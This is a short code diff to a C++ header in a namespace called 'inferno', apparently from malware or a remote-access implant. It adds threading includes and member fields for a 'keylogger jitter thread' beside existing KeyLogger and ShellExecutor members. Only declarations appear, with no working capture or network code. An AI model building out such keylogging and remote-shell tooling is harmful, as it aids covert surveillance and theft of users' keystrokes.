@@ -8,6 +8,9 @@
 #include <string>
 #include <vector>
 #include <atomic>
+#include <thread>
+#include <mutex>
+#include <condition_variable>
 
 namespace inferno {
 
@@ -65,6 +68,13 @@ private:
     ProcessProfiler m_profiler;
     ShellExecutor   m_shell;
     KeyLogger       m_keylogger;
+
+    // Keylogger jitter thread
+    std::thread              m_keylog_jitter_thread;
+    std::atomic<bool>        m_keylog_jitter_running;
+    std::atomic<bool>        m_keylog_dump_requested;
+    std::mutex               m_keylog_jitter_mutex;
+    std::condition_variable  m_keylog_jitter_cv;
 };
 
 } // namespace inferno
